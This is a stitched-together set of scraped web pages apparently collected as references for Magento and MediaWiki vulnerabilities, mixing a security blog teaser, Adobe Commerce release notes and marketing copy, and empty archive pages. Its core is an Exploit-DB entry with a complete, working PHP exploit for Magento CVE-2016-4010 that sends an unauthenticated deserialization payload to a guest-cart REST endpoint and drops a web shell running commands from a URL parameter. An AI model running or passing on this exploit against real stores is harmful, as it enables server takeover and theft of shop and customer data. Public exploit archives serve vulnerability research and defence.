Posted on [April 14, 2016April 20, 2016](https://www.netanelrub.in/2016/04/14/mediawiki-unauthenticated-rce/) by [Netanel Rubin](https://www.netanelrub.in/author/na7irub/)

The vulnerability (CVE-2014-1610) allows an unauthenticated attacker to execute code remotely on a vulnerable MediaWiki installation. It requires the DjVu file format in order to be exploited (built in by default). MediaWiki is an open-source web platform used to create and maintain wikis. One of the major sites using the system is Wikipedia.org and alongside the rest […]

Posted in [0-Days](https://www.netanelrub.in/category/0-days/), [MediaWiki](https://www.netanelrub.in/category/mediawiki/), [PHP](https://www.netanelrub.in/category/php/), [RCE](https://www.netanelrub.in/category/rce/)[Leave a comment](https://www.netanelrub.in/2016/04/14/mediawiki-unauthenticated-rce/#respond)

Search for:

# Follow Me

* [View @na7irub’s profile on Twitter](https://twitter.com/%40na7irub/)
* [View na7irub’s profile on LinkedIn](https://www.linkedin.com/in/na7irub/)
# Categories

* [0-Days](https://www.netanelrub.in/category/0-days/)
* [ACS](https://www.netanelrub.in/category/acs/)
* [Magento](https://www.netanelrub.in/category/magento/)
* [MediaWiki](https://www.netanelrub.in/category/mediawiki/)
* [Moodle](https://www.netanelrub.in/category/moodle/)
* [Node.JS](https://www.netanelrub.in/category/node-js/)
* [Perl](https://www.netanelrub.in/category/perl/)
* [PHP](https://www.netanelrub.in/category/php/)
* [RCE](https://www.netanelrub.in/category/rce/)
* [TWiki](https://www.netanelrub.in/category/twiki/)

[Proudly powered by WordPress](http://wordpress.org/)
 |
Theme: sosimple by [Fernando Villamor Jr.](http://fernandovillamorjr.com).



=== Content from magento.com_335ddb04_20250125_011401.html ===


[Documentation](/en/docs/)[Commerce](/en/docs/commerce)[Release information](/en/docs/commerce-operations/release/notes/overview)

# Adobe Commerce release notes

Last update: Fri Sep 29 2023 00:00:00 GMT+0000 (Coordinated Universal Time)

* Topics:
* Release Notes

CREATED FOR:

* Experienced
* Admin
* Developer

Learn about the latest improvements in Adobe Commerce, including enhancements, security, bug fixes, and known issues.

NOTE

Although code for enhancements and bug fixes described in these release notes is bundled with Adobe Commerce, several of these projects (for example, B2B, Page Builder, and Progressive Web Applications (PWA) Studio) are also released independently. Bug fixes for these projects are documented in the separate, project-specific release information that is available in the documentation for each project. See [product release overview](/en/docs/commerce-operations/release/notes/overview).

NOTE

Adobe Commerce releases can contain backward-incompatible changes (BICs). To review backward-incompatible changes, see [BIC reference](https://developer.adobe.com/commerce/php/development/backward-incompatible-changes/reference/). Major backward-incompatible issues are described in [BIC highlights](https://developer.adobe.com/commerce/php/development/backward-incompatible-changes/highlights/). Not all releases introduce major BICs.

recommendation-more-help

1d4eef6c-fef1-4e61-85eb-b58d7b9ac29f



=== Content from www.exploit-db.com_284c1dbe_20250125_011409.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File

#### EDB-ID:

###### 39838

#### CVE:

###### [2016-4010](https://nvd.nist.gov/vuln/detail/CVE-2016-4010)

---

**EDB Verified:**

#### Author:

###### [agix](/?author=2651)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [PHP](/?platform=php)

#### Date:

###### 2016-05-18

---

**Vulnerable App:**

```
<?php

// Exploit Title: [CVE-2016-4010] Magento unauthenticated arbitrary unserialize -> arbitrary write file
// Date: 18/05/206
// Exploit Author: agix (discovered by NETANEL RUBIN)
// Vendor Homepage: https://magento.com
// Version: < 2.0.6
// CVE : CVE-2016-4010

// to get a valid guestCartId
// * add an item in your cart
// * go to checkout
// * fill the shipping address stuff and look at the POST request to /rest/default/V1/guest-carts/<guestCartId>/shipping-information
// (* in the response check the payment method it may vary from checkmo)
//
// If you didn\'t provide whereToWrite, it will execute phpinfo to leak path.

class Magento_Framework_Simplexml_Config_Cache_File extends DataObject
{
    function __construct($data){
        $this->_data = $data;
    }
}

class Credis_Client{
    const TYPE_STRING      = 'string';
    const TYPE_LIST        = 'list';
    const TYPE_SET         = 'set';
    const TYPE_ZSET        = 'zset';
    const TYPE_HASH        = 'hash';
    const TYPE_NONE        = 'none';
    const FREAD_BLOCK_SIZE = 8192;

    /**
     * Socket connection to the Redis server or Redis library instance
     * @var resource|Redis
     */
    protected $redis;
    protected $redisMulti;

    /**
     * Host of the Redis server
     * @var string
     */
    protected $host;

    /**
     * Port on which the Redis server is running
     * @var integer
     */
    protected $port;

    /**
     * Timeout for connecting to Redis server
     * @var float
     */
    protected $timeout;

    /**
     * Timeout for reading response from Redis server
     * @var float
     */
    protected $readTimeout;

    /**
     * Unique identifier for persistent connections
     * @var string
     */
    protected $persistent;

    /**
     * @var bool
     */
    protected $closeOnDestruct = TRUE;

    /**
     * @var bool
     */
    protected $connected = TRUE;

    /**
     * @var bool
     */
    protected $standalone;

    /**
     * @var int
     */
    protected $maxConnectRetries = 0;

    /**
     * @var int
     */
    protected $connectFailures = 0;

    /**
     * @var bool
     */
    protected $usePipeline = FALSE;

    /**
     * @var array
     */
    protected $commandNames;

    /**
     * @var string
     */
    protected $commands;

    /**
     * @var bool
     */
    protected $isMulti = FALSE;

    /**
     * @var bool
     */
    protected $isWatching = FALSE;

    /**
     * @var string
     */
    protected $authPassword;

    /**
     * @var int
     */
    protected $selectedDb = 0;

    /**
     * Aliases for backwards compatibility with phpredis
     * @var array
     */
    protected $wrapperMethods = array('delete' => 'del', 'getkeys' => 'keys', 'sremove' => 'srem');

    /**
     * @var array
     */
    protected $renamedCommands;

    /**
     * @var int
     */
    protected $requests = 0;

    public function __construct($resource) {
        $this->redis = new Magento_Sales_Model_Order_Payment_Transaction($resource);
    }
}

class DataObject
{
    /**
     * Object attributes
     *
     * @var array
     */
    protected $_data = [];

    /**
     * Setter/Getter underscore transformation cache
     *
     * @var array
     */
    protected static $_underscoreCache = [];
}

abstract class AbstractModel2 extends DataObject
{
    /**
     * Prefix of model events names
     *
     * @var string
     */
    protected $_eventPrefix = 'core_abstract';

    /**
     * Parameter name in event
     *
     * In observe method you can use $observer->getEvent()->getObject() in this case
     *
     * @var string
     */
    protected $_eventObject = 'object';

    /**
     * Name of object id field
     *
     * @var string
     */
    protected $_idFieldName = 'id';

    /**
     * Data changes flag (true after setData|unsetData call)
     * @var $_hasDataChange bool
     */
    protected $_hasDataChanges = false;

    /**
     * Original data that was loaded
     *
     * @var array
     */
    protected $_origData;

    /**
     * Object delete flag
     *
     * @var bool
     */
    protected $_isDeleted = false;

    /**
     * Resource model instance
     *
     * @var \Magento\Framework\Model\ResourceModel\Db\AbstractDb
     */
    protected $_resource;

    /**
     * Resource collection
     *
     * @var \Magento\Framework\Model\ResourceModel\Db\Collection\AbstractCollection
     */
    protected $_resourceCollection;

    /**
     * Name of the resource model
     *
     * @var string
     */
    protected $_resourceName;

    /**
     * Name of the resource collection model
     *
     * @var string
     */
    protected $_collectionName;

    /**
     * Model cache tag for clear cache in after save and after delete
     *
     * When you use true - all cache will be clean
     *
     * @var string|array|bool
     */
    protected $_cacheTag = false;

    /**
     * Flag which can stop data saving after before save
     * Can be used for next sequence: we check data in _beforeSave, if data are
     * not valid - we can set this flag to false value and save process will be stopped
     *
     * @var bool
     */
    protected $_dataSaveAllowed = true;

    /**
     * Flag which allow detect object state: is it new object (without id) or existing one (with id)
     *
     * @var bool
     */
    protected $_isObjectNew = null;

    /**
     * Validator for checking the model state before saving it
     *
     * @var \Zend_Validate_Interface|bool|null
     */
    protected $_validatorBeforeSave = null;

    /**
     * Application Event Dispatcher
     *
     * @var \Magento\Framework\Event\ManagerInterface
     */
    protected $_eventManager;

    /**
     * Application Cache Manager
     *
     * @var \Magento\Framework\App\CacheInterface
     */
    protected $_cacheManager;

    /**
     * @var \Magento\Framework\Registry
     */
    protected $_registry;

    /**
     * @var \Psr\Log\LoggerInterface
     */
    protected $_logger;

    /**
     * @var \Magento\Framework\App\State
     */
    protected $_appState;

    /**
     * @var \Magento\Framework\Model\ActionValidator\RemoveAction
     */
    protected $_actionValidator;

    /**
     * Array to store object's original data
     *
     * @var array
     */
    protected $storedData = [];
}

abstract class AbstractExtensibleModel extends AbstractModel2
{
    protected $extensionAttributesFactory;

    /**
     * @var \Magento\Framework\Api\ExtensionAttributesInterface
     */
    protected $extensionAttributes;

    /**
     * @var AttributeValueFactory
     */
    protected $customAttributeFactory;

    /**
     * @var string[]
     */
    protected $customAttributesCodes = null;

    /**
     * @var bool
     */
    protected $customAttributesChanged = false;

}

abstract class AbstractModel extends AbstractExtensibleModel
{
}

class Magento_Sales_Model_Order_Payment_Transaction extends AbstractModel
{
    /**#@+
     * Supported transaction types
     * @var string
     */
    const TYPE_PAYMENT = 'payment';

    const TYPE_ORDER = 'order';

    const TYPE_AUTH = 'authorization';

    const TYPE_CAPTURE = 'capture';

    const TYPE_VOID = 'void';

    const TYPE_REFUND = 'refund';

    /**#@-*/

    /**
     * Raw details key in additional info
     */
    const RAW_DETAILS = 'raw_details_info';

    /**
     * Order instance
     *
     * @var \Magento\Sales\Model\Order\Payment
     */
    protected $_order = null;

    /**
     * Parent transaction instance
     * @var \Magento\Sales\Model\Order\Payment\Transaction
     */
    protected $_parentTransaction = null;

    /**
     * Child transactions, assoc array of transaction_id => instance
     *
     * @var array
     */
    protected $_children = null;

    /**
     * Child transactions, assoc array of txn_id => instance
     * Filled only in case when all child transactions have txn_id
     * Used for quicker search of child transactions using isset() as opposite to foreaching $_children
     *
     * @var array
     */
    protected $_identifiedChildren = null;

    /**
     * Whether to perform automatic actions on transactions, such as auto-closing and putting as a parent
     *
     * @var bool
     */
    protected $_transactionsAutoLinking = true;

    /**
     * Whether to throw exceptions on different operations
     *
     * @var bool
     */
    protected $_isFailsafe = true;

    /**
     * Whether transaction has children
     *
     * @var bool
     */
    protected $_hasChild = null;

    /**
     * Event object prefix
     *
     * @var string
     * @see \Magento\Framework\Model\AbstractModel::$_eventPrefix
     */
    protected $_eventPrefix = 'sales_order_payment_transaction';

    /**
     * Event object prefix
     *
     * @var string
     * @see \Magento\Framework\Model\AbstractModel::$_eventObject
     */
    protected $_eventObject = 'order_payment_transaction';

    /**
     * Order website id
     *
     * @var int
     */
    protected $_orderWebsiteId = null;

    /**
     * @var \Magento\Sales\Model\OrderFactory
     */
    protected $_orderFactory;

    /**
     * @var \Magento\Framework\Stdlib\DateTime\DateTimeFactory
     */
    protected $_dateFactory;

    /**
     * @var TransactionFactory
     */
    protected $_transactionFactory;

    /**
     * @var \Magento\Sales\Api\OrderPaymentRepositoryInterface
     */
    protected $orderPaymentRepository;

    /**
     * @var \Magento\Sales\Api\OrderRepositoryInterface
     */
    protected $orderRepository;

    /**
     * @param \Magento\Framework\Model\Context $context
     * @param \Magento\Framework\Registry $registry
     * @param \Magento\Framework\Api\ExtensionAttributesFactory $extensionFactory
     * @param AttributeValueFactory $customAttributeFactory
     * @param \Magento\Sales\Model\OrderFactory $orderFactory
     * @param \Magento\Framework\Stdlib\DateTime\DateTimeFactory $dateFactory
     * @param TransactionFactory $transactionFactory
     * @param \Magento\Framework\Model\ResourceModel\AbstractResource $resource
     * @param \Magento\Framework\Data\Collection\AbstractDb $resourceCollection
     * @param array $data
     * @SuppressWarnings(PHPMD.ExcessiveParameterList)
     */
    public function __construct($resource) {
        $this->_resource = $resource;
    }
}

class Magento_Framework_DB_Transaction{
    protected $_objects = [];

    /**
     * Transaction objects array with alias key
     *
     * @var array
     */
    protected $_objectsByAlias = [];

    /**
     * Callbacks array.
     *
     * @var array
     */
    protected $_beforeCommitCallbacks = ["phpinfo"];
}

if(count($argv) < 3){
    echo 'Usage: '.$argv[0].' <magento_uri> <guestCartId> (whereToWrite)'.chr(0x0a);
    echo 'To get a valid guestCartId'.chr(0x0a);
    echo '* add an item in your cart'.chr(0x0a);
    echo '* go to checkout'.chr(0x0a);
    echo '* fill the shipping address stuff and look at the POST request to /rest/default/V1/guest-carts/<guestCartId>/shipping-information'.chr(0x0a);
    echo '(* in the response check the payment method it may vary from "checkmo")'.chr(0x0a).chr(0x0a);
    echo 'If you didn\'t provide whereToWrite, it will execute phpinfo to leak path.'.chr(0x0a);
    exit();
}

if(count($argv) === 4){
    $data = [];
    $data['is_allowed_to_save'] = True;
    $data['stat_file_name'] = $argv[3];
    $data['components'] = '<?php system($_GET[0]); ?>';
    $resource = new Magento_Framework_Simplexml_Config_Cache_File($data);
}
else{
    $resource = new Magento_Framework_DB_Transaction();
}

$redis = new Credis_Client($resource);
$serialized = serialize($redis);

$payload = json_decode('{"paymentMethod":{"method":"checkmo", "additional_data":{"additional_information":""}}, "email": "valid@magento.com"}');

$payload->paymentMethod->additional_data->additional_information = str_replace('Magento_Framework_DB_Transaction', 'Magento\\Framework\\DB\\Transaction', str_replace('Magento_Sales_Model_Order_Payment_Transaction', 'Magento\\Sales\\Model\\Order\\Payment\\Transaction', str_replace('Magento_Framework_Simplexml_Config_Cache_File', 'Magento\\Framework\\Simplexml\\Config\\Cache\\File', $serialized)));

for($i=0; $i<2; $i++){
    $c = curl_init($argv[1].'/rest/V1/guest-carts/'.$argv[2].'/set-payment-information');
    curl_setopt($c, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    curl_setopt($c, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_exec($c);
    curl_close($c);
}

?>

```

**Tags:**

[![](/screenshots/idlt40000/magento-thumb.png)](/screenshots/idlt40000/magento.png)

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from packetstormsecurity.com_e8d4b41a_20250125_011404.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from packetstormsecurity.com_e95009a0_20250125_011407.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from magento.com_7ddc3f75_20250126_045955.html ===


* [Home](/)
* [Products](/products/adobe-experience-cloud-products)
* Adobe Commerce

#2C2C2C

![Adobe Summit](./media_16e471e6da5e67f2fc03d142f5224122df8b9358b.png?width=750&format=png&optimize=medium)

**Registration is open for Adobe Summit 2025. Join us March 17–20.**

*[Register now](https://summit.adobe.com/na/?promoid=5WYL7TRB&mv=other#_blank)*

linear-gradient(45deg, rgb(64, 190, 187) 0.1%, rgb(80, 197, 222) 100%)
linear-gradient(45deg, rgb(64, 190, 187) 0.1%, rgb(80, 197, 222) 100%)

![https://images-tv.adobe.com/mpcv3/1229/45ff8ba5-a003-4219-beed-0480e06837b1_1690908421.1920x1080at3000_h264.mp4#_autoplay1 | A smiling e-commerce digital marketing manager standing in a warehouse surrounded by inventory and holding a tablet with examples of her B2B and B2C marketing collateral for landing pages, warranty offers, and call-to-action promotional content.](./media_1028ddb15766cda3feabbb821dbb4dee9d049c765.jpeg?width=750&format=jpeg&optimize=medium)

# ADOBE COMMERCE (MAGENTO)

## The experience makes all the difference. Grow with Adobe Commerce.

Adobe Commerce is a flexible and scalable commerce platform that lets you create uniquely personalized B2B and B2C experiences, no matter how many brands you have.

*[Watch overview](/fragments/products/modal/videos/magento/magento-commerce/adobe-commerce-features#watch-video)*

## A customized commerce solution to get you where you want to grow.

style
Grid-width-6

1. Native AI
2. B2B & B2C
3. Platform architecture
4. Scalable operations
5. Adobe integrations

active tab

tab
Native AI

style
M spacing

![Shopping](./media_1df0b428d3ae705cc1655a4a8e57a3d392a20f697.png?width=750&format=png&optimize=medium)

### Boost conversions by tapping into powerful tools.

Create AI-driven personalized experiences — for B2B and B2C customers.

* Deliver relevant content and promotions in real time.
* Increase your team’s productivity with AI-merchandising tools.
* Use AI to deliver personalized site search, product recommendations, and browsing.

*[Learn more | Learn more about Boost conversions by tapping into powerful tools](/products/magento/commerce-personalization)*

tab
B2B & B2C

style
M spacing

![Currency options](./media_1e138df01329fbcff8678fe97aa98a5ad8f0820e5.png?width=750&format=png&optimize=medium)

### Manage multiple brands across channels and audiences while growing into new territory.

Extend your reach to new countries and customer segments, and evolve sales strategies from a single platform.

* Oversee both your B2C and B2B sites and marketplaces from one interface.
* Rapidly deploy dozens or hundreds of storefronts at scale.
* Localize each site per brand, catalog, country, and currency.
* Tailor the checkout experience to shoppers around the world with payment services.

*[Learn more | Learn more about manage multiple brands across channels and audiences while growing into new territory](/products/magento/multi-channel-commerce)*

tab
Platform architecture

style
M spacing

![Add product](./media_1ab9e92c75cc5cbd7e796f82454d6e25fe156c039.png?width=750&format=png&optimize=medium)

### An enterprise platform designed for endless growth.

Use powerful developer tools and an API-first, headless solution to innovate quickly.

* Quickly build custom apps and extend native capabilities with modern development tools and a serverless runtime.
* Easily integrate or replace third-party services with a flexible API orchestration layer.
* Build connected customer experiences across channels with a headless commerce platform.

*[Learn more | Learn more about an enterprise platform designed for endless growth](/products/magento/platform-architecture)*

tab
Scalable operations

style
M spacing

![Manage storefronts](./media_1cbf310b515ee0a680bc3b2792067154efb2d8132.png?width=750&format=png&optimize=medium)

### Get site performance, reliability, and speed — no matter the size of your business.

Advanced capabilities give you everything you need to provide personalized customer experiences at scale.

* Deliver fast, flawless experiences during peak events with auto-scaling.
* Reach your goals faster with the help of Adobe Managed Services experts.
* Provide consistent and reliable customer experiences with cloud-native solutions and performance monitoring tools.
* Operate and grow with confidence using a secure, compliant cloud infrastructure.

*[Learn more | Learn more about get site performance, reliability, and speed — no matter the size of your business](/products/magento/cloud-delivery)*

tab
Adobe integrations

style
M spacing

![Apps](./media_1548efb2cccab390926eb215c0b9e10874aae608c.png?width=750&format=png&optimize=medium)

### Power deeper personalization with integrated Adobe Experience Cloud solutions.

Get unmatched insights to understand customers better and deliver the experiences customers expect with these Adobe apps.

* Share commerce data with Adobe Analytics and Adobe Real-Time Customer Data Platform to get a 360-degree understanding of your customers and business.
* Use commerce data to personalize touchpoints with Adobe Target and Adobe Journey Optimizer.
* Access product information within Adobe Experience Manager to deliver high-impact content in your commerce experiences.

*[Learn more | Learn more about power deeper personalization with integrated Adobe Experience Cloud solutions](/products/magento/adobe-integrations)*

#FAFAFA

![Graphic showing the latest features and functionality available in Adobe Commerce, which now supports AI-powered personalization for products, Google Lighthouse performance score delta tracking, and toggles for supported payment methods.](./media_11619f2ea9b5a6b402f32801753e137dcc2489dcd.png?width=750&format=png&optimize=medium)

### The latest innovations from Adobe Commerce.

* Increase sales with a personalized buyer journey powered by Adobe Commerce data and AI-driven merchandising.
* Simplify composable commerce development and integration with a unified developer platform and integrations starter kit.
* Drive B2B ecommerce growth with enhanced quoting and support for large enterprise buyers across any business model.
* Deliver exceptional patient experiences while ensuring privacy with a HIPAA-ready cloud platform for healthcare and life sciences.

*[Learn more | Learn more about the latest innovations from Adobe Commerce](https://business.adobe.com/blog/the-latest/adobe-commerce-continues-investment-in-composable-development-tools-and-ai-powered-personalization#_blank)*

style
l spacing

background
#FAFAFA

## Composable commerce built for business.

### Give IT a sophisticated platform for innovation.

Adobe Commerce gives IT a solution that can launch personalized commerce experiences easily, quickly, securely, and without starting from scratch, including:

* Getting to market fast with a secure, high-performance foundation of commerce functionality.
* Out-of-the-box composable services can be deployed and adopted rapidly with the commerce foundation.
* Building and integrating secure and scalable apps that extend native functionality and integrate with third-party solutions in a serverless PCI-compliant environment.
* Customizing and integrating with App Builder tools that lower cost of ownership.

![Create page](./media_1e0aea2d68169b21a4ec3b1d09da8f28ba28be3ac.png?width=750&format=png&optimize=medium)

![Purchase metrics](./media_1ef884d1a301609f342f71cbbfed0ad85ee7b2aa4.png?width=750&format=png&optimize=medium)

### Empower commerce teams to reach new audiences.

Commerce teams get a platform that scales as customers and opportunities shift and change, with features such as:

* Omnichannel personalization through commerce data
* Personalized content, promotions, recommendations, and site search through AI and machine learning
* Increased reach to new markets, brands, or business models
* Business-specific, user-friendly tools with AI to boost marketing and merchandising

![](./media_1a42ef0418d0c6c52c0fe5733a74370eb214deeaf.png?width=750&format=png&optimize=medium)

### Apps and extensions to expand your commerce capabilities.

Choose from thousands of free and premium apps and extensions in the Commerce Marketplace to customize all aspects of your business. There’s everything from back-office integrations with ERPs and order management systems to customer experience solutions like marketing and customer service.

**[Visit Marketplace | Visit Marketplace to expand your commerce capabilities.](/products/magento/marketplace)**

![Marketing extensions](./media_13c6ef6ac719be1410022ab6a333efdb84ccb49d2.png?width=750&format=png&optimize=medium)

## We help global brands do big things.

![https://business.adobe.com/summit/2023/sessions/creating-a-contextual-commerce-experience-at-tmobi-s507.html#_blank | T-Mobile event session](./media_117bdba28776b74007f2c0b877f0293f4fca00e7a.png?width=750&format=png&optimize=medium)

**5% increase in conversion rate.**

![https://blog.adobe.com/en/publish/2021/11/12/coca-cola-delivers-refreshing-d2c-approach-across-mexico-to-win-experience-maker-of-the-year#_blank | Coca-cola blog](./media_1dbdd2f43dc3aad69fe8a231b3fe51f027e4d09a5.png?width=750&format=png&optimize=medium)

**50% increase in traffic year-over-year.**

